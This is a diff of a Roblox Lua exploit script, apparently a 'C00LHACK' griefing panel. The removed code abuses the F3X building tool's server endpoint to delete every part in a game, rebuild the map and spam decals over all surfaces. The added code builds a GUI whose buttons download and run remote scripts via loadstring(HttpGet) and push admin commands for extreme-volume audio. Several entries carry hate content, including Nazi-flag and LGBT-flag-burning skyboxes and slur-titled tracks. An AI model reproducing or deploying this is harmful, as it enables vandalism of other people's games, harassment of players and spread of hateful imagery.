@@ -1,208 +1,263 @@
-local MyTargetID = "122714132204276"
-local MusicID = "104181508980428"
+-- [[ COOLREALM GIANT MATRIX TERMINAL v3.5 ]] --
+local musicList = {
+    {Name = "stop Music", ID = " ", Pitch = 0},
+    -- موزیک‌های جدید اضافه شده
+    {Name = "HR", ID = "16190782181", Pitch = 1},
+    {Name = "baby laugh", ID = "132504204562767", Pitch = 0.2},
+    {Name = "TIKI TIKI", ID = "72957306505286", Pitch = 1},
+    {Name = "stealed", ID = "70771842083730", Pitch = 1},
+    {Name = "lord theme", ID = "1839272148", Pitch = 1},
+    {Name = "Amazing", ID = "79999206651848", Pitch = 0.22},
+    {Name = "Killer Fish", ID = "7217112043", Pitch = 1},
+    {Name = "Worship", ID = "247893371", Pitch = 1},
+    -- لیست قبلی
+    {Name = "China meme", ID = "121922837560201", Pitch = 0.22},
+    {Name = "k00p Theme", ID = "1839246711", Pitch = 0.8},
+    {Name = "c00lkidd Theme", ID = "95156028272944", Pitch = 0.22},
+    {Name = "retrokidd oid Theme", ID = "104879348278763", Pitch = 0.8},
+    {Name = "الله أكبر", ID = "124956805967048", Pitch = 1},
+    {Name = "Allah is great.", ID = "85390427326662", Pitch = 0.08},
+    {Name = "wont'stop US", ID = "1847661821", Pitch = 1},
+    {Name = "spooy skeletons", ID = "122552583844805", Pitch = 0.1},
+    {Name = "AHHHHH", ID = "3152833592", Pitch = 0.8},
+    {Name = "Lnickys Theme", ID = "86412047196482", Pitch = 1},
+    {Name = "Gothic", ID = "139488665764275", Pitch = 1},
+    {Name = "Backroom", ID = "120817494107898", Pitch = 0.8},
+    {Name = "Erica(ww2Germany)", ID = "102894811708275", Pitch = 0.1},
+    {Name = "sonic.exe", ID = "133180219581309", Pitch = 0.1},
+    {Name = "re join・realm join", ID = "9069609200", Pitch = 1},
+    {Name = "CAN'T STOP RAVING", ID = "89787069440374", Pitch = 1},
+    {Name = "java 1x3x5x6 Theme", ID = "94284750410104", Pitch = 0.2},
+    {Name = "colkax Theme", ID = "71485248296105", Pitch = 1},
+    {Name = "get job!!!", ID = "112747391792663", Pitch = 1},
+    {Name = "You Are An Idiot Remix xxd'", ID = "102295928741521", Pitch = 0.14},
+    {Name = "jump style", ID = "90426128566369", Pitch = 1},
+    {Name = "USSRДля нашей родины", ID = "109261572535017", Pitch = 0.1},
+    {Name = "GETOUT!!!", ID = "17573042535", Pitch = 1},
+    {Name = "SANEEES", ID = "100093014571503", Pitch = 1},
+    {Name = "HERE I COME", ID = "78534559289195", Pitch = 1},
+    {Name = "sad song", ID = "125591252722564", Pitch = 0.1},
+    {Name = "c00kidd funk", ID = "100828050594137", Pitch = 1},
+    {Name = "Low Throat Singing 3", ID = "1845939536", Pitch = 1},
+    {Name = "d3r, m1v, asteria no escape", ID = "18841891575", Pitch = 1},
+    {Name = "[ww2]na## Germany", ID = "1845868993", Pitch = 1},
+    {Name = "jumpscare sound", ID = "6129291390", Pitch = 1},
+    {Name = "Erica funk", ID = "72796362292502", Pitch = 0.1},
+    {Name = "Squid game", ID = "1843536434", Pitch = 1},
+    {Name = "Painters Sparta", ID = "76286178156432", Pitch = 0.2},
+    {Name = "'Euro Techno'", ID = "1839246734", Pitch = 1},
+    {Name = "'wongaaa'", ID = "136201301642679", Pitch = 0.1},
+    {Name = "what mr krabs wish he had", ID = "106282004905868", Pitch = 0.1},
+    {Name = "'/...'", ID = "112226782551255", Pitch = 0.1},
+    {Name = "'f##k N###'", ID = "110587373430189", Pitch = 0.1},
+    {Name = "''Illuminati'", ID = "105355441763420", Pitch = 0.1},
+    {Name = "''bodypartz''", ID = "127653283576622", Pitch = 1}, 
+    {Name = "nowjoinWorldofkoopkidd", ID = "8894394467", Pitch = 1}, 
+    {Name = "Spain Music", ID = "77535208560062", Pitch = 1}, 
+    {Name = "loser", ID = "87617522673082", Pitch = 0.7}, 
+    {Name = "B2STheme", ID = "91475390903970", Pitch = 1}, 
+    {Name = "godisagirlnightcore", ID = "100033974889149", Pitch = 0.8}, 
+    {Name = "gangsta'sparadise", ID = "5228173823", Pitch = 1}, 
+    {Name = "'whatmrkrabswishhehad", ID = "106282004905868", Pitch = 0.1}, 
+    {Name = "jump style slow", ID = "1839246711", Pitch = 0.2}, 
+    {Name = "jump style speed up", ID = "1839246711", Pitch = 1.2},
+    {Name = "7 Weeks And 3 Days", ID = "82149511707056", Pitch = 1}
+}
 
-local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Player = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
 
--- پیدا کردن هوشمند ابزار F3X
-local tool
-for _, v in ipairs(Player:GetDescendants()) do
-    if v.Name == "SyncAPI" then tool = v.Parent break end
+if CoreGui:FindFirstChild("MatrixGiantPanel") then
+    CoreGui.MatrixGiantPanel:Destroy()
 end
-if not tool then
-    for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if v.Name == "SyncAPI" then tool = v.Parent break end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MatrixGiantPanel"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
+
+-- فریم اصلی ترمینال (ارتفاع به 980 افزایش یافت تا دکمه‌های جدید بدون تداخل جا بشن)
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 650, 0, 1050)
+MainFrame.Position = UDim2.new(0.5, -325, 0.5, -490)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+-- تایتل بار
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
+Title.BorderSizePixel = 1
+Title.BorderColor3 = Color3.fromRGB(0, 255, 0)
+Title.Text = "C00LHACK F3X GUI"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0)
+Title.Font = Enum.Font.Code
+Title.TextSize = 18
+Title.TextScaled = true
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = MainFrame
+
+-- دکمه بستن پنل (X)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 45, 0, 45)
+CloseBtn.Position = UDim2.new(1, -45, 0, 0)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+CloseBtn.BorderSizePixel = 1
+CloseBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+CloseBtn.Font = Enum.Font.Code
+CloseBtn.TextSize = 25
+CloseBtn.TextScaled = true
+CloseBtn.Parent = MainFrame
+CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
+
+-- تابع ارسال هوشمند چت
+local function SendChatMessage(msg)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then channel:SendAsync(msg) end
+    else
+        local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+        if remote then remote:FireServer(msg, "All") end
     end
 end
 
-if not tool or not tool:FindFirstChild("SyncAPI") then
-    warn("ابزار F3X پیدا نشد!")
-    return
+-- کانتینر دکمه‌های میانبر بالای منو
+local TopBtnContainer = Instance.new("Frame")
+TopBtnContainer.Size = UDim2.new(0, 200, 0, 35)
+TopBtnContainer.Position = UDim2.new(1, -255, 0, 5)
+TopBtnContainer.BackgroundTransparency = 1
+TopBtnContainer.Parent = MainFrame
+
+local function CreateTopShortcut(name, cmd, xpos)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 90, 1, 0)
+    btn.Position = UDim2.new(0, xpos, 0, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 20, 0)
+    btn.BorderSizePixel = 1
+    btn.BorderColor3 = Color3.fromRGB(0, 255, 0)
+    btn.Text = name
+    btn.TextColor3 = Color3.fromRGB(0, 255, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextScaled = true
+    btn.Parent = TopBtnContainer
+    btn.MouseButton1Click:Connect(function() SendChatMessage(cmd) end)
 end
 
-local remote = tool.SyncAPI.ServerEndpoint
-local function _(args)
-    return remote:InvokeServer(unpack(args))
+CreateTopShortcut("R6", ";r6", 0)
+CreateTopShortcut("Btools", ";btools", 100)
+
+-- کانتینر اسکریپت‌های اصلی (ارتفاع به 290 افزایش یافت تا دکمه‌ها در ۴ ردیف بدون مشکل جا شوند)
+local ScriptContainer = Instance.new("Frame")
+ScriptContainer.Size = UDim2.new(0, 610, 0, 290)
+ScriptContainer.Position = UDim2.new(0, 20, 0, 65)
+ScriptContainer.BackgroundTransparency = 1
+ScriptContainer.Parent = MainFrame
+
+local ScriptGrid = Instance.new("UIGridLayout")
+ScriptGrid.CellSize = UDim2.new(0, 195, 0, 50)
+ScriptGrid.CellPadding = UDim2.new(0, 12, 0, 10)
+ScriptGrid.Parent = ScriptContainer
+
+local function CreateScriptBlock(name, link)
+    local Btn = Instance.new("TextButton")
+    Btn.BackgroundColor3 = Color3.fromRGB(0, 15, 0)
+    Btn.BorderSizePixel = 1
+    Btn.BorderColor3 = Color3.fromRGB(0, 200, 0)
+    Btn.Text = name
+    Btn.TextColor3 = Color3.fromRGB(0, 255, 0)
+    Btn.Font = Enum.Font.Code
+    Btn.TextScaled = true
+    Btn.Parent = ScriptContainer
+    Btn.MouseButton1Click:Connect(function()
+        SendChatMessage(";btools")
+        pcall(function() loadstring(game:HttpGet(link))() end)
+    end)
 end
 
----------------------------------------------------------
--- DEFINED FULL 6-SIDE DECAL SPAM ENGINE ----------------
----------------------------------------------------------
-local function RunDecalSpam(id)
-    local descendants = workspace:GetDescendants()
+-- اسکریپت‌های قبلی
+CreateScriptBlock("C00LHACK REALM", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/coolrealmf3x")
+CreateScriptBlock("C00LHACK DECAL SPAM", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/decalscript")
+CreateScriptBlock("Skybox C00LHACK", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxscript")
+CreateScriptBlock("Dancing Skeleton Skybox", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/sk1")
+CreateScriptBlock("C00LKIDD SkyBox", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxcokid")
+CreateScriptBlock("Skybox Iluminati", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxilum")
+CreateScriptBlock("Skybox Tubers93", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxtubers")
+CreateScriptBlock("Skybox IDK", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxidk")
+CreateScriptBlock("Skybox N*zi Flag", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxlag1")
+CreateScriptBlock("Skybox Burn LGBT Flag", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/skyboxlag2")
+
+-- دکمه‌های Decal Spam
+CreateScriptBlock("DECAL SPAM Iluminati", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/de1")
+CreateScriptBlock("DECAL SPAM IDK", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/de2")
+CreateScriptBlock("DECAL SPAM Tubers93", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/de3")
+CreateScriptBlock("DECAL SPAM C00LKIDD", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/de4")
+CreateScriptBlock("Particles", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/particle")
+CreateScriptBlock("ExtraGuiX9D(Map Loader)", "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/polarisdis")
+
+-- هدر بخش دیتابیس موزیک (موقعیت Y به 370 منتقل شد تا به هیچ وجه تداخل ایجاد نشود)
+local MusicTitle = Instance.new("TextLabel")
+MusicTitle.Size = UDim2.new(0, 610, 0, 35)
+MusicTitle.Position = UDim2.new(0, 20, 0, 439)
+MusicTitle.BackgroundTransparency = 1
+MusicTitle.Text = "Bypassed Audios:"
+MusicTitle.TextColor3 = Color3.fromRGB(0, 180, 0)
+MusicTitle.Font = Enum.Font.Code
+MusicTitle.TextSize = 20
+MusicTitle.TextXAlignment = Enum.TextXAlignment.Left
+MusicTitle.Parent = MainFrame
+
+-- فریم اسکرول آیتم‌های موزیک پلیر (موقعیت Y به 410 منتقل شد)
+local ScrollFrame = Instance.new("ScrollingFrame")
+ScrollFrame.Size = UDim2.new(0, 610, 0, 540)
+ScrollFrame.Position = UDim2.new(0, 20, 0, 500)
+ScrollFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 0)
+ScrollFrame.BorderSizePixel = 1
+ScrollFrame.BorderColor3 = Color3.fromRGB(0, 100, 0)
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, math.ceil(#musicList / 3) * 65)
+ScrollFrame.ScrollBarThickness = 8
+ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 0)
+ScrollFrame.Parent = MainFrame
+
+local MusicGrid = Instance.new("UIGridLayout")
+MusicGrid.CellSize = UDim2.new(0, 190, 0, 50)
+MusicGrid.CellPadding = UDim2.new(0, 8, 0, 8)
+MusicGrid.Parent = ScrollFrame
+
+-- لود دکمه‌های موزیک در ماتریس منو
+for index, music in ipairs(musicList) do
+    local ItemButton = Instance.new("TextButton")
+    ItemButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    ItemButton.BorderSizePixel = 1
+    ItemButton.BorderColor3 = Color3.fromRGB(0, 50, 0)
+    ItemButton.Text = music.Name
+    ItemButton.TextColor3 = Color3.fromRGB(0, 200, 0)
+    ItemButton.Font = Enum.Font.Code
+    ItemButton.TextScaled = true
+    ItemButton.Parent = ScrollFrame
     
-    local allFaces = {
-        Enum.NormalId.Front,
-        Enum.NormalId.Back,
-        Enum.NormalId.Top,
-        Enum.NormalId.Bottom,
-        Enum.NormalId.Left,
-        Enum.NormalId.Right
-    }
-    
-    for i = 1, #descendants do
-        local v = descendants[i]
-        if v:IsA("BasePart") and v.Name ~= "CustomSkybox" then
-            _({"SetLocked", {v}, false})
+    ItemButton.MouseButton1Click:Connect(function()
+        if music.Name == "stop Music" then
+            SendChatMessage(";unmusic")
+            SendChatMessage(";stop")
             
-            task.spawn(function()
-                for j = 1, #allFaces do
-                    local currentFace = allFaces[j]
-                    _({"CreateTextures", {{Part = v, Face = currentFace, TextureType = "Decal"}}})
-                    _({"SyncTexture", {{Part = v, Face = currentFace, TextureType = "Decal", Texture = "rbxassetid://" .. id}}})
-                end
-            end)
-        end
-    end
-end
-
----------------------------------------------------------
--- SAFE ANTI-VOID FLOW ----------------------------------
----------------------------------------------------------
-task.spawn(function()
-    local char = Player.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    
-    -- ۱. فریز کردن کاراکتر روی هوا
-    if root then
-        _({"SyncAnchor", {{Part = root, Anchored = true}}})
-    end
-    
-    -- ۲. پاکسازی کامل محیط ورک‌پیس
-    local items = workspace:GetDescendants()
-    for i = 1, #items do
-        local v = items[i]
-        if v:IsA("BasePart") or v:IsA("UnionOperation") then
-            if v ~= root and not v:IsDescendantOf(char) then
-                task.spawn(function()
-                    _({"Remove", {v}})
-                end)
+            local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient") and ReplicatedStorage.HDAdminHDClient:FindFirstChild("Signals")
+            local fireCmd = hd and (hd:FindFirstChild("RequestCommandSilent") or hd:FindFirstChild("RequestCommand"))
+            if fireCmd then
+                fireCmd:InvokeServer(";stopmusic")
+            end
+        else
+            local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient") and ReplicatedStorage.HDAdminHDClient:FindFirstChild("Signals")
+            local fireCmd = hd and (hd:FindFirstChild("RequestCommandSilent") or hd:FindFirstChild("RequestCommand"))
+            if fireCmd then
+                fireCmd:InvokeServer(";music " .. music.ID .. " ;pitch " .. tostring(music.Pitch) .. " ;volume 999999999")
             end
         end
-    end
-    
-    task.wait(0.2)
-    
-    -- ۳. محاسبات دقیق موقعیت ستاپ مپ
-    local spawnPos = root and root.Position or Vector3.new(0, 0, 0)
-    local baseCF = CFrame.new(spawnPos.X, spawnPos.Y - 20, spawnPos.Z)
-    
-    ---------------------------------------------------------
-    -- حل باگ: ارتفاع آسمان بدون مشکل تا 1200 واحد بالا می‌رود
-    ---------------------------------------------------------
-    local skyHeight = 1200
-    local skyCF = CFrame.new(spawnPos.X, spawnPos.Y + skyHeight, spawnPos.Z)
-    
-    local wallFrontCF = baseCF * CFrame.new(0, 70, -80)
-    local wallBackCF = baseCF * CFrame.new(0, 70, 80)
-    
-    -- پخش آنلاین آهنگ و سیاه کردن مه سرور
-    local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient") and ReplicatedStorage.HDAdminHDClient:FindFirstChild("Signals")
-    local fireCmd = hd and (hd:FindFirstChild("RequestCommandSilent") or hd:FindFirstChild("RequestCommand"))
-    if fireCmd then
-        fireCmd:InvokeServer(";music " .. MusicID .. " ;pitch 0.22 ;volume 999999999 ;fogcolor black")
-    end
-
-    ---------------------------------------------------------
-    -- اصلاح منطق ساخت: ذخیره مستقیم پارت‌ها در متغیرها برای حل باگ عدم شناسایی ارتفاع
-    ---------------------------------------------------------
-    local cleanBase = _({"CreatePart", "Normal", baseCF, workspace})
-    local skyPart = _({"CreatePart", "Normal", skyCF, workspace})
-    local w1 = _({"CreatePart", "Normal", wallFrontCF, workspace})
-    local w2 = _({"CreatePart", "Normal", wallBackCF, workspace})
-    
-    -- ساخت دیوارهای قلعه
-    local castleWalls = {}
-    local r = math.random
-    for i = 1, 20 do
-        local offsetX = r(-220, 220)
-        local offsetZ = r(-220, 220)
-        
-        if math.abs(offsetX) < 45 and math.abs(offsetZ) < 45 then
-            offsetX = offsetX + 65
-        end
-        
-        local castleCF = baseCF * CFrame.new(offsetX, 90, offsetZ)
-        local cWall = _({"CreatePart", "Normal", castleCF, workspace})
-        if cWall then
-            table.insert(castleWalls, {Part = cWall, CF = castleCF})
-        end
-    end
-    
-    task.wait(0.05)
-    
-    -- ۴. کانفیگ سریع بیس‌پلیت
-    if cleanBase then
-        task.spawn(function()
-            _({"SetName", {cleanBase}, "CleanBaseplate"})
-            _({"SyncResize", {{Part = cleanBase, CFrame = baseCF, Size = Vector3.new(512, 16, 512)}}})
-            _({"SyncMaterial", {{Part = cleanBase, Material = Enum.Material.Concrete}}})
-            _({"SyncColor", {{Part = cleanBase, Color = Color3.new(0.2, 0.2, 0.2), UnionColoring = false}}})
-            _({"SetLocked", {cleanBase}, false})
-            _({"SyncAnchor", {{Part = cleanBase, Anchored = true}}})
-        end)
-    end
-    
-    -- دیوارهای جلو و عقب فوق‌العاده عریض و بلند
-    local walls = {w1, w2}
-    local wallCFs = {wallFrontCF, wallBackCF}
-    for i = 1, #walls do
-        local wall = walls[i]
-        if wall then
-            task.spawn(function()
-                _({"SetName", {wall}, "NearWall_" .. i})
-                _({"SyncResize", {{Part = wall, CFrame = wallCFs[i], Size = Vector3.new(150, 160, 4)}}})
-                _({"SyncMaterial", {{Part = wall, Material = Enum.Material.Concrete}}})
-                _({"SyncColor", {{Part = wall, Color = Color3.new(0.2, 0.2, 0.2), UnionColoring = false}}})
-                _({"SyncAnchor", {{Part = wall, Anchored = true}}})
-            end)
-        end
-    end
-    
-    -- ضخامت دیوارهای قلعه
-    for i = 1, #castleWalls do
-        local wallData = castleWalls[i]
-        if wallData.Part then
-            task.spawn(function()
-                _({"SetName", {wallData.Part}, "CastlePillar_" .. i})
-                _({"SyncResize", {{Part = wallData.Part, CFrame = wallData.CF, Size = Vector3.new(r(15, 35), 180, 12)}}})
-                _({"SyncMaterial", {{Part = wallData.Part, Material = Enum.Material.Concrete}}})
-                _({"SyncColor", {{Part = wallData.Part, Color = Color3.new(0.15, 0.15, 0.15), UnionColoring = false}}})
-                _({"SyncAnchor", {{Part = wallData.Part, Anchored = true}}})
-            end)
-        end
-    end
-    
-    if skyPart then
-        task.spawn(function()
-            _({"SetName", {skyPart}, "CustomSkybox"})
-            _({"CreateMeshes", {{Part = skyPart}}})
-            ---------------------------------------------------------
-            -- اسکیل به شدت عمودی (32000) برای اینکه کل کشیدگی تا ته عکس روی زمین معلوم باشد
-            ---------------------------------------------------------
-            _({"SyncMesh", {{Part = skyPart, MeshId = "rbxassetid://111891702759441", TextureId = "rbxassetid://" .. MyTargetID, Scale = Vector3.new(25000, 32000, 25000)}}})
-            _({"SetLocked", {skyPart}, true})
-            _({"SyncCollision", {{Part = skyPart, CanCollide = false}}})
-            _({"SyncAnchor", {{Part = skyPart, Anchored = true}}})
-        end)
-    end
-    
-    -- ۵. پایداری و آن‌فریز شدن کاراکتر روی مپ جدید
-    repeat task.wait(0.05) until workspace:FindFirstChild("CleanBaseplate")
-    task.wait(0.1)
-    
-    if root then
-        _({"SyncAnchor", {{Part = root, Anchored = false}}})
-    end
-    
-    task.wait(0.001)
-    
-    -- ۷. اجرای دکال اسپم ۱۰۰ درصدی روی کل پارت‌ها
-    RunDecalSpam(MyTargetID)
-    
-    -- قفل کردن نهایی آبجکت‌ها
-    if cleanBase then _({"SetLocked", {cleanBase}, true}) end
-    for i = 1, #walls do if walls[i] then _({"SetLocked", {walls[i]}, true}) end end
-    for i = 1, #castleWalls do if castleWalls[i].Part then _({"SetLocked", {castleWalls[i].Part}, true}) end end
-end)
+    end)
+end
